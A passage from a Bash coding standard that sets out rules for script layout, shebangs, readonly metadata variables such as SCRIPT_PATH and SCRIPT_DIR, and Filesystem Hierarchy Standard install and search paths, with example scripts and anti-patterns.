# Runs automatically when sourced!
main "$@"
#fin
```

**Problem:** When sourced, this modifies the caller's shell settings and runs `main` automatically.

### ✓ Correct: Dual-Purpose Script

```bash
#!/usr/bin/env bash
# Only set strict mode when executed (not sourced)

error() { >&2 echo "ERROR: $*"; }

die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Only run main when executed (not sourced)
# Fast exit if sourced
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Now start main script
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME  # These never change

: ...

main() {
  echo 'Running main'
  : ...
}

main "$@"

#fin
```

---

## Edge Cases and Variations

### When to Skip `main()` Function

**Small scripts under 40 lines** can skip `main()` and run directly:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Simple file counter - only 20 lines total
declare -i count=0

for file in "$@"; do
  [[ ! -f "$file" ]] || count+=1
done

echo "Found $count files"
#fin
```

**Rationale:** The overhead of `main()` isn't justified for trivial scripts.

### Sourced Library Files

**Files meant only to be sourced** can skip execution parts:

```bash
#!/usr/bin/env bash
# Library of utility functions - meant to be sourced, not executed

# Don't use set -e when sourced (would affect caller)
# Don't make variables readonly (caller might need to modify)

is_integer() {
  [[ "$1" =~ ^-?[0-9]+$ ]]
}

is_valid_email() {
  [[ "$1" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]
}

# No main(), no execution
# Just function definitions for other scripts to use
#fin
```

### Scripts With External Configuration

**When sourcing config files**, structure might include:

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Default configuration
declare -- CONFIG_FILE="${XDG_CONFIG_HOME:-$HOME/.config}/myapp/config.sh"
declare -- DATA_DIR="${XDG_DATA_HOME:-$HOME/.local/share}/myapp"

# Source config file if it exists and can be read
if [[ -r "$CONFIG_FILE" ]]; then
  #shellcheck source=/dev/null
  source "$CONFIG_FILE" || die 1 "Failed to source config '$CONFIG_FILE'"
fi

# Now make readonly after sourcing config
readonly -- CONFIG_FILE DATA_DIR

# ... rest of script
```

### Platform-Specific Sections

**When handling multiple platforms:**

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Detect platform
declare -- PLATFORM
case $(uname -s) in
  Darwin) PLATFORM='macos' ;;
  Linux)  PLATFORM='linux' ;;
  *)      PLATFORM='unknown' ;;
esac
readonly -- PLATFORM

# Platform-specific global variables
case $PLATFORM in
  macos)
    declare -- PACKAGE_MANAGER='brew'
    declare -- INSTALL_CMD='brew install'
    ;;
  linux)
    declare -- PACKAGE_MANAGER='apt'
    declare -- INSTALL_CMD='apt-get install'
    ;;
  *)
    die 1 "Unsupported platform '$PLATFORM'"
    ;;
esac

readonly -- PACKAGE_MANAGER INSTALL_CMD

: ... rest of script
```

### Scripts With Cleanup Requirements

**When trap handlers are needed:**

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Temporary files array for cleanup
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=${1:-$?}
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ ! -f "$file" ]] || rm -f "$file"
  done

  return "$exit_code"
}

# Set trap early, after functions are defined
trap 'cleanup $?' SIGINT SIGTERM EXIT

# ... rest of script uses TEMP_FILES
```

**Trap should be set** after cleanup function is defined but before any code that creates temp files.

---

## Recommended General Structure of Bash Scripts

Man=Mandatory Opt=Optional Rec=Recommended

### Executable Scripts

| Order | Status | Step | Comments |
|  0 | Man | '^#!shebang' ||
|  1 | Opt | '^#shellcheck' ||
|  2 | Opt | '^# ' | Multi-line Comments. Ends at first non-'^# ' line. Should usually have at least one short description line.|
|  3 | Man | 'set -euo pipefail' | MANDATORY first command before any other commands are executed|
|  4 | Opt | Bash 5 version test | (very rarely needed) |
|  5 | Rec | 'shopt'|standard 'shopt' settings|
|  6 | Rec | Script Metadata||
|  7 | Rec | Global Variable Declarations||
|  8 | Rec | Color Definitions | (if terminal output) |
|  9 | Rec | Utility Functions | (including Messaging) |
| 10 | Rec | Business Logic Functions||
| 11 | Rec | 'main()' | Function and Full Options/Argument Parsing|
| 12 | Rec | 'main "$@"'| Script Invocation|
| 13 | Man | '#end' Marker||

### Module/Library Scripts

| Order | Status | Step
|  0 | Man | '^#!shebang' |
|  1 | Opt | '^#shellcheck' |
|  2 | Opt | '^# ' |
|  4 | Opt | Bash 5 version test |
|  6 | Opt | Script Metadata|
|  7 | Opt | Global Variable Declarations|
|  8 | Opt | Color Definitions |
|  9 | Opt | Utility Functions |
| 10 | Rec | Business Logic Functions|
| 13 | Man | '#end' Marker|

### Combined Module/Library-Executable Scripts

| Order | Status | Step
|  0 | Man | '^#!shebang' |
|  1 | Opt | '^#shellcheck' |
|  2 | Opt | '^# ' |
|  3 | Opt | 'set -euo pipefail' |
|  4 | Opt | Bash 5 version test |
|  5 | Opt | 'shopt'|
|  6 | Opt | Script Metadata|
|  7 | Opt | Global Variable Declarations|
|  8 | Opt | Color Definitions |
|  9 | Opt | Utility Functions |
| 10 | Man | Business Logic Functions|
| 14    | Man | `[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0` |
| 14.0  | Man | '^#!shebang' ||
| 14.1  | Opt | '^#shellcheck' ||
| 14.2  | Opt | '^# ' | Multi-line Comments. Ends at first non-'^# ' line. Should usually have at least one short description line.|
| 14.3  | Man | 'set -euo pipefail' | MANDATORY first command before any other commands are executed|
| 14.4  | Opt | Bash 5 version test | (very rarely needed) |
| 14.5  | Rec | 'shopt'|standard 'shopt' settings|
| 14.6  | Rec | Script Metadata||
| 14.7  | Rec | Global Variable Declarations||
| 14.8  | Rec | Color Definitions | (if terminal output) |
| 14.9  | Rec | Utility Functions | (including Messaging) |
| 14.10 | Rec | Business Logic Functions||
| 14.11 | Rec | 'main()' | Function and Full Options/Argument Parsing|
| 14.12 | Rec | 'main "$@"'| Script Invocation|
| 14.13 | Man | '#end' Marker||

---

## Summary

**The 13-step layout is strongly recommended** - it's the foundation of all scripts in this coding standard. This structure:

1. **Guarantees safety** - Error handling comes first, nothing runs without it
2. **Ensures consistency** - Every script follows the same pattern
3. **Enables testing** - `main()` function allows sourcing for tests
4. **Prevents errors** - Bottom-up organization means dependencies are always defined before use
5. **Documents intent** - Structure itself tells you what the script does and how it works
6. **Simplifies maintenance** - Know where everything goes, no guessing

**For scripts over 100 lines**, all 13 steps should be done. **For smaller scripts**, steps 11-12 (main function) can be skipped, but all other steps remain required.

**When in doubt**, follow the complete 13-step structure - the benefits far outweigh the minor overhead. Every production script should follow this pattern exactly.

This layout is the result of years of experience and represents best practices for Bash scripting. Deviations from this structure should be rare and well-justified.


---


**Rule: BCS010201**

/ai/scripts/Okusi/bash-coding-standard/data/01-script-structure/02-shebang/01-dual-purpose.complete.md


---


**Rule: BCS0102**

### Shebang and Initial Setup
First lines of all scripts must include a `#!shebang`, global `#shellcheck` definitions (optional), a brief description of the script, and first command `set -euo pipefail`.

```bash
#!/bin/bash
#shellcheck disable=SC1090,SC1091
# Get directory sizes and report usage statistics
set -euo pipefail
```

**Allowable shebangs:**

1. `#!/bin/bash` - **Most portable**, works on most Linux systems
   - Use when: Script will run on known Linux systems with bash in standard location

2. `#!/usr/bin/bash` - **FreeBSD/BSD systems**
   - Use when: Targeting BSD systems where bash is in /usr/bin

3. `#!/usr/bin/env bash` - **Maximum portability**
   - Use when: Bash location varies (different systems, development environments)
   - Searches PATH for bash, works across diverse environments

**Rationale:** These three shebangs cover all common scenarios while maintaining compatibility. The first command must be `set -euo pipefail` to enable strict error handling immediately, before any other commands execute.


---


**Rule: BCS0103**

### Script Metadata

**Every script must declare standard metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) immediately after `shopt` settings and before any other code. Make these readonly as a group.**

**Rationale:**

- **Reliable Path Resolution**: Using `realpath` provides canonical absolute paths and fails early if the script doesn't exist, preventing errors when script is called from different directories
- **Self-Documentation**: VERSION provides clear versioning for deployment and debugging
- **Resource Location**: SCRIPT_DIR enables reliable loading of companion files, libraries, and configuration
- **Logging and Error Messages**: SCRIPT_NAME provides consistent script identification in logs and error output
- **Defensive Programming**: Making metadata readonly prevents accidental modification that could break resource loading
- **Consistency**: Standard metadata variables work the same way across all scripts, reducing cognitive load

**Standard metadata pattern:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata - immediately after shopt
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Rest of script follows
\`\`\`

**Metadata variables explained:**

**1. VERSION**
- **Purpose**: Semantic version of the script
- **Format**: Major.Minor.Patch (e.g., '1.0.0', '2.3.1')
- **Used for**: `--version` output, logging, deployment tracking
- **Example usage**: `echo "$SCRIPT_NAME $VERSION"`

\`\`\`bash
VERSION='1.0.0'

# Display version
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Log with version
info "Starting $SCRIPT_NAME $VERSION"
\`\`\`

**2. SCRIPT_PATH**
- **Purpose**: Absolute canonical path to the script file
- **Resolves**: Symlinks, relative paths, `.` and `..` components
- **Command**: `realpath -- "$0"`
  - `--`: Prevents option injection if filename starts with `-`
  - `"$0"`: Current script name/path
  - **Behavior**: Fails if file doesn't exist (intentional - catches errors early)
  - **Builtin available**: A loadable builtin for realpath is available for maximum performance

\`\`\`bash
SCRIPT_PATH=$(realpath -- "$0")
# Examples:
# /usr/local/bin/myapp
# /home/user/projects/app/deploy.sh
# /opt/app/bin/processor

# Use for logging script location
debug "Running from: $SCRIPT_PATH"
\`\`\`

**3. SCRIPT_DIR**
- **Purpose**: Directory containing the script
- **Derivation**: `${SCRIPT_PATH%/*}` removes last `/` and everything after
- **Used for**: Loading companion files, finding resources relative to script

\`\`\`bash
SCRIPT_DIR=${SCRIPT_PATH%/*}
# Examples:
# If SCRIPT_PATH=/usr/local/bin/myapp
# Then SCRIPT_DIR=/usr/local/bin

# If SCRIPT_PATH=/home/user/projects/app/bin/deploy.sh
# Then SCRIPT_DIR=/home/user/projects/app/bin

# Load library from same directory
source "$SCRIPT_DIR/lib/common.sh"

# Read configuration from relative path
config_file="$SCRIPT_DIR/../conf/app.conf"
\`\`\`

**4. SCRIPT_NAME**
- **Purpose**: Base name of the script (filename only, no path)
- **Derivation**: `${SCRIPT_PATH##*/}` removes everything up to last `/`
- **Used for**: Error messages, logging, `--help` output

\`\`\`bash
SCRIPT_NAME=${SCRIPT_PATH##*/}
# Examples:
# If SCRIPT_PATH=/usr/local/bin/myapp
# Then SCRIPT_NAME=myapp

# If SCRIPT_PATH=/home/user/deploy.sh
# Then SCRIPT_NAME=deploy.sh

# Use in error messages
die() {
  local -i exit_code=$1
  shift
  >&2 echo "$SCRIPT_NAME: error: $*"
  exit "$exit_code"
}

# Use in help text
show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE

Process FILE according to configured rules.
EOF
}
\`\`\`

**Why readonly as a group:**

\`\`\`bash
# ✓ Correct - make readonly together after all assignments
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# This pattern:
# 1. Groups related declarations visibly
# 2. Makes intent clear (these are immutable metadata)
# 3. Prevents accidental reassignment anywhere in script
\`\`\`

**Using metadata for resource location:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Load libraries relative to script location
source "$SCRIPT_DIR/lib/logging.sh"
source "$SCRIPT_DIR/lib/validation.sh"

# Load configuration
declare -- config_file="$SCRIPT_DIR/../etc/app.conf"
[[ -f "$config_file" ]] && source "$config_file"

# Access data files
declare -- data_dir="$SCRIPT_DIR/../share/data"
[[ -d "$data_dir" ]] || die 2 "Data directory not found: $data_dir"

# Use metadata in logging
info "Starting $SCRIPT_NAME $VERSION"
debug "Script location: $SCRIPT_PATH"
debug "Config: $config_file"
\`\`\`

**Edge case: Script in root directory**

\`\`\`bash
# If script is /myscript (in root directory)
SCRIPT_PATH='/myscript'
SCRIPT_DIR=${SCRIPT_PATH%/*}  # Results in empty string!

# Solution: Handle this edge case if script might be in /
SCRIPT_DIR=${SCRIPT_PATH%/*}
[[ -z "$SCRIPT_DIR" ]] && SCRIPT_DIR='/'
readonly -- SCRIPT_DIR

# Or use dirname (less portable)
SCRIPT_DIR=$(dirname -- "$SCRIPT_PATH")
\`\`\`

**Edge case: Sourced vs executed**

\`\`\`bash
# When script is sourced, $0 is the calling shell, not the script
# To detect if sourced:
if [[ "${BASH_SOURCE[0]}" != "$0" ]]; then
  # Script is being sourced
  SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
else
  # Script is being executed
  SCRIPT_PATH=$(realpath -- "$0")
fi

SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
\`\`\`

**Why realpath over readlink:**

\`\`\`bash
# realpath is the canonical BCS approach because:
# 1. Simpler syntax: No need for -e and -n flags (default behavior is correct)
# 2. Builtin available: Loadable builtin provides maximum performance
# 3. Widely available: Standard on modern Linux systems
# 4. POSIX compliant: realpath is in POSIX, readlink is GNU-specific
# 5. Consistent behavior: realpath fails if file doesn't exist (catches errors early)

# ✓ Correct - use realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Avoid - readlink requires -en flags (more complex, GNU-specific)
SCRIPT_PATH=$(readlink -en -- "$0")

# Note: realpath without -m will fail if file doesn't exist
# This is INTENTIONAL - we want to catch missing scripts early
# If you need to allow missing files, use: realpath -m -- "$0"
# (But for SCRIPT_PATH, we always want existing files)

# For maximum performance, load realpath as builtin:
# enable -f /usr/local/lib/bash-builtins/realpath.so realpath
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - using $0 directly without realpath
SCRIPT_PATH="$0"  # Could be relative path or symlink!

# ✓ Correct - resolve with realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Wrong - using dirname and basename (requires external commands)
SCRIPT_DIR=$(dirname "$0")
SCRIPT_NAME=$(basename "$0")

# ✓ Correct - use parameter expansion (faster, more reliable)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - using PWD for script directory
SCRIPT_DIR="$PWD"  # Wrong! This is current working directory, not script location

# ✓ Correct - derive from SCRIPT_PATH
SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - making readonly individually
readonly VERSION='1.0.0'
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}  # Can't assign to readonly variable!

# ✓ Correct - assign first, then make readonly as group
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR

# ✗ Wrong - no VERSION variable
# Every script should have a version for tracking

# ✓ Correct - include VERSION
VERSION='1.0.0'

# ✗ Wrong - using inconsistent variable names
SCRIPT_VERSION='1.0.0'  # Should be VERSION
SCRIPT_DIRECTORY="$SCRIPT_DIR"  # Redundant
MY_SCRIPT_PATH="$SCRIPT_PATH"  # Non-standard

# ✓ Correct - use standard names
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - declaring metadata late in script
# ... 50 lines of code ...
VERSION='1.0.0'  # Too late! Should be near top

# ✓ Correct - declare immediately after shopt
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
VERSION='1.0.0'  # Right after shopt
\`\`\`

**Complete example with metadata usage:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Global variables
declare -- LOG_FILE="$SCRIPT_DIR/../logs/$SCRIPT_NAME.log"
declare -- CONFIG_FILE="$SCRIPT_DIR/../etc/$SCRIPT_NAME.conf"

# Messaging functions
info() {
  echo "[$SCRIPT_NAME] $*" | tee -a "$LOG_FILE"
}

error() {
  >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"
}

die() {
  local -i exit_code=$1
  shift
  error "$*"
  exit "$exit_code"
}

# Show version
show_version() {
  echo "$SCRIPT_NAME $VERSION"
}

# Show help with script name
show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS]

Process data according to configuration.

Options:
  -h, --help     Show this help message
  -V, --version  Show version information

Version: $VERSION
Location: $SCRIPT_PATH
EOF
}

# Load configuration from script directory
load_config() {
  if [[ -f "$CONFIG_FILE" ]]; then
    info "Loading configuration from $CONFIG_FILE"
    source "$CONFIG_FILE"
  else
    die 2 "Configuration file not found: $CONFIG_FILE"
  fi
}

main() {
  info "Starting $SCRIPT_NAME $VERSION"
  info "Running from: $SCRIPT_PATH"

  load_config

  # Main logic here
  info 'Processing complete'
}

main "$@"

#fin
\`\`\`

**Testing metadata:**

\`\`\`bash
# Test that metadata is set correctly
test_metadata() {
  # VERSION should be set
  [[ -n "$VERSION" ]] || die 1 'VERSION not set'

  # SCRIPT_PATH should be absolute
  [[ "$SCRIPT_PATH" == /* ]] || die 1 'SCRIPT_PATH is not absolute'

  # SCRIPT_PATH should exist
  [[ -f "$SCRIPT_PATH" ]] || die 1 'SCRIPT_PATH does not exist'

  # SCRIPT_DIR should be a directory
  [[ -d "$SCRIPT_DIR" ]] || die 1 'SCRIPT_DIR is not a directory'

  # SCRIPT_NAME should not contain /
  [[ "$SCRIPT_NAME" != */* ]] || die 1 'SCRIPT_NAME contains /'

  # All should be readonly
  readonly -p | grep -q 'VERSION' || die 1 'VERSION not readonly'
  readonly -p | grep -q 'SCRIPT_PATH' || die 1 'SCRIPT_PATH not readonly'

  success 'Metadata validation passed'
}
\`\`\`

**Summary:**

- **Always declare metadata** immediately after `shopt` settings
- **Use standard names**: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- **Use realpath** to resolve SCRIPT_PATH reliably (canonical BCS approach)
- **Derive SCRIPT_DIR and SCRIPT_NAME** from SCRIPT_PATH using parameter expansion
- **Make readonly as a group** after all assignments
- **Use metadata** for resource location, logging, error messages, version display
- **Handle edge cases**: root directory, sourced scripts
- **Performance**: Consider loading realpath as builtin for maximum speed

**Key principle:** Metadata provides the foundation for reliable script operation. Declaring it consistently at the top of every script enables predictable behavior regardless of how the script is invoked or where it's located.


---


**Rule: BCS0104**

### Filesystem Hierarchy Standard (FHS) Preference

**When designing scripts that install files or search for resources, follow the Filesystem Hierarchy Standard (FHS) where practical. FHS compliance enables predictable file locations, supports both system and user installations, and integrates smoothly with package managers.**

**Rationale:**

- **Predictability**: Users and package managers expect files in standard locations (`/usr/local/bin/`, `/usr/share/`, etc.)
- **Multi-Environment Support**: Scripts work correctly in development, local install, system install, and user-specific install scenarios
- **Package Manager Compatibility**: FHS-compliant layouts work seamlessly with apt, yum, pacman, etc.
- **No Hardcoded Paths**: Using FHS search patterns eliminates brittle absolute paths
- **Portability**: Scripts work across different Linux distributions without modification
- **Separation of Concerns**: FHS separates executables, data, configuration, and documentation logically

**Common FHS locations:**
- `/usr/local/bin/` - User-installed executables (system-wide, not managed by package manager)
- `/usr/local/share/` - Architecture-independent data files
- `/usr/local/lib/` - Libraries and loadable modules
- `/usr/local/etc/` - Configuration files
- `/usr/bin/` - System executables (managed by package manager)
- `/usr/share/` - System-wide architecture-independent data
- `$HOME/.local/bin/` - User-specific executables (in user's PATH)
- `$HOME/.local/share/` - User-specific data files
- `${XDG_CONFIG_HOME:-$HOME/.config}/` - User-specific configuration

**When FHS is useful:**
- Installation scripts that need to place files in standard locations
- Scripts that search for data files in multiple standard locations
- Scripts that support both system-wide and user-specific installation
- Projects distributed to multiple systems expecting standard paths

**Example pattern - searching for data files:**
```bash
find_data_file() {
  local -- script_dir="$1"
  local -- filename="$2"
  local -a search_paths=(
    "$script_dir"/"$filename"  # Same directory (development)
    /usr/local/share/myapp/"$filename" # Local install
    /usr/share/myapp/"$filename" # System install
    "${XDG_DATA_HOME:-$HOME/.local/share}/myapp/$filename"  # User install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done

  return 1
}
```

**Complete installation example (Makefile pattern):**

\`\`\`bash
#!/bin/bash
# install.sh - FHS-compliant installation script
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Installation paths (customizable via PREFIX)
declare -- PREFIX="${PREFIX:-/usr/local}"
declare -- BIN_DIR="$PREFIX/bin"
declare -- SHARE_DIR="$PREFIX/share/myapp"
declare -- LIB_DIR="$PREFIX/lib/myapp"
declare -- ETC_DIR="$PREFIX/etc/myapp"
declare -- MAN_DIR="$PREFIX/share/man/man1"
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR MAN_DIR

install_files() {
  # Create directories
  install -d "$BIN_DIR"
  install -d "$SHARE_DIR"
  install -d "$LIB_DIR"
  install -d "$ETC_DIR"
  install -d "$MAN_DIR"

  # Install executable
  install -m 755 "$SCRIPT_DIR/myapp" "$BIN_DIR/myapp"

  # Install data files
  install -m 644 "$SCRIPT_DIR/data/template.txt" "$SHARE_DIR/template.txt"

  # Install libraries
  install -m 644 "$SCRIPT_DIR/lib/common.sh" "$LIB_DIR/common.sh"

  # Install configuration (preserve existing)
  if [[ ! -f "$ETC_DIR/myapp.conf" ]]; then
    install -m 644 "$SCRIPT_DIR/myapp.conf.example" "$ETC_DIR/myapp.conf"
  fi

  # Install man page
  install -m 644 "$SCRIPT_DIR/docs/myapp.1" "$MAN_DIR/myapp.1"

  info "Installation complete to $PREFIX"
  info "Executable: $BIN_DIR/myapp"
}

uninstall_files() {
  # Remove installed files
  rm -f "$BIN_DIR/myapp"
  rm -f "$SHARE_DIR/template.txt"
  rm -f "$LIB_DIR/common.sh"
  rm -f "$MAN_DIR/myapp.1"

  # Remove directories if empty
  rmdir --ignore-fail-on-non-empty "$SHARE_DIR"
  rmdir --ignore-fail-on-non-empty "$LIB_DIR"
  rmdir --ignore-fail-on-non-empty "$ETC_DIR"

  info "Uninstallation complete"
}

main() {
  case "${1:-install}" in
    install)   install_files ;;
    uninstall) uninstall_files ;;
    *)         die 2 "Usage: $SCRIPT_NAME {install|uninstall}" ;;
  esac
}

main "$@"

#fin
\`\`\`

**FHS-aware resource loading pattern:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Find data file using FHS search pattern
find_data_file() {
  local -- filename="$1"
  local -a search_paths=(
    # Development: same directory as script
    "$SCRIPT_DIR/$filename"

    # Local install: /usr/local/share
    "/usr/local/share/myapp/$filename"

    # System install: /usr/share
    "/usr/share/myapp/$filename"

    # User install: XDG Base Directory
    "${XDG_DATA_HOME:-$HOME/.local/share}/myapp/$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    if [[ -f "$path" ]]; then
      echo "$path"
      return 0
    fi
  done

  die 2 "Data file not found: $filename"
}

# Find configuration file with XDG support
find_config_file() {
  local -- filename="$1"
  local -a search_paths=(
    # User-specific config (highest priority)
    "${XDG_CONFIG_HOME:-$HOME/.config}/myapp/$filename"

    # System-wide local config
    "/usr/local/etc/myapp/$filename"

    # System-wide config
    "/etc/myapp/$filename"

    # Development/fallback
    "$SCRIPT_DIR/$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    if [[ -f "$path" ]]; then
      echo "$path"
      return 0
    fi
  done

  # Return empty if not found (config is optional)
  return 1
}

# Load library from FHS locations
load_library() {
  local -- lib_name="$1"
  local -a search_paths=(
    # Development
    "$SCRIPT_DIR/lib/$lib_name"

    # Local install
    "/usr/local/lib/myapp/$lib_name"

    # System install
    "/usr/lib/myapp/$lib_name"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    if [[ -f "$path" ]]; then
      source "$path"
      return 0
    fi
  done

  die 2 "Library not found: $lib_name"
}

main() {
  # Load required library
  load_library 'common.sh'

  # Find data file
  local -- template
  template=$(find_data_file 'template.txt')
  info "Using template: $template"

  # Find config file (optional)
  local -- config
  if config=$(find_config_file 'myapp.conf'); then
    info "Loading config: $config"
    source "$config"
  else
    info 'No config file found, using defaults'
  fi

  # Main logic here
}

main "$@"

#fin
\`\`\`

**PREFIX customization (make install pattern):**

\`\`\`bash
# Makefile example
PREFIX ?= /usr/local
BINDIR = $(PREFIX)/bin
SHAREDIR = $(PREFIX)/share/myapp
MANDIR = $(PREFIX)/share/man/man1

install:
	install -d $(BINDIR)
	install -d $(SHAREDIR)
	install -d $(MANDIR)
	install -m 755 myapp $(BINDIR)/myapp
	install -m 644 data/template.txt $(SHAREDIR)/template.txt
	install -m 644 docs/myapp.1 $(MANDIR)/myapp.1

uninstall:
	rm -f $(BINDIR)/myapp
	rm -f $(SHAREDIR)/template.txt
	rm -f $(MANDIR)/myapp.1

# Usage:
# make install                  # Installs to /usr/local
# make PREFIX=/usr install      # Installs to /usr
# make PREFIX=$HOME/.local install  # User install
\`\`\`

**XDG Base Directory Specification:**

For user-specific files, follow XDG Base Directory spec:

\`\`\`bash
# XDG environment variables with fallbacks
declare -- XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"
declare -- XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
declare -- XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
declare -- XDG_STATE_HOME="${XDG_STATE_HOME:-$HOME/.local/state}"

# User-specific paths
declare -- USER_DATA_DIR="$XDG_DATA_HOME/myapp"
declare -- USER_CONFIG_DIR="$XDG_CONFIG_HOME/myapp"
declare -- USER_CACHE_DIR="$XDG_CACHE_HOME/myapp"
declare -- USER_STATE_DIR="$XDG_STATE_HOME/myapp"

# Create user directories if needed
install -d "$USER_DATA_DIR"
install -d "$USER_CONFIG_DIR"
install -d "$USER_CACHE_DIR"
install -d "$USER_STATE_DIR"
\`\`\`

**Real-world example from this repository:**

The `bash-coding-standard` script searches for `BASH-CODING-STANDARD.md` in:

\`\`\`bash
find_bcs_file() {
  local -a search_paths=(
    # Development: same directory as script
    "$SCRIPT_DIR/BASH-CODING-STANDARD.md"

    # Local install: /usr/local/share
    '/usr/local/share/yatti/bash-coding-standard/BASH-CODING-STANDARD.md'

    # System install: /usr/share
    '/usr/share/yatti/bash-coding-standard/BASH-CODING-STANDARD.md'
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done

  die 2 'BASH-CODING-STANDARD.md not found in any standard location'
}

BCS_FILE=$(find_bcs_file)
\`\`\`

This approach allows the script to work in:
- Development mode (running from source directory)
- After `make install` (to /usr/local)
- After `make PREFIX=/usr install` (system-wide)
- When installed by package manager (debian, rpm, etc.)

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - hardcoded absolute path
data_file='/home/user/projects/myapp/data/template.txt'

# ✓ Correct - FHS search pattern
data_file=$(find_data_file 'template.txt')

# ✗ Wrong - assuming specific install location
source /usr/local/lib/myapp/common.sh

# ✓ Correct - search multiple FHS locations
load_library 'common.sh'

# ✗ Wrong - using relative paths from CWD
source ../lib/common.sh  # Breaks when run from different directory

# ✓ Correct - paths relative to script location
source "$SCRIPT_DIR/../lib/common.sh"

# ✗ Wrong - installing to non-standard location
install myapp /opt/random/location/bin/

# ✓ Correct - use PREFIX-based FHS paths
install myapp "$PREFIX/bin/"

# ✗ Wrong - not supporting PREFIX customization
BIN_DIR=/usr/local/bin  # Hardcoded

# ✓ Correct - respect PREFIX environment variable
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"

# ✗ Wrong - mixing executables and data in same directory
install myapp /opt/myapp/
install template.txt /opt/myapp/

# ✓ Correct - separate by FHS hierarchy
install myapp "$PREFIX/bin/"
install template.txt "$PREFIX/share/myapp/"

# ✗ Wrong - overwriting user configuration on upgrade
install myapp.conf "$PREFIX/etc/myapp/myapp.conf"

# ✓ Correct - preserve existing config
[[ -f "$PREFIX/etc/myapp/myapp.conf" ]] || \
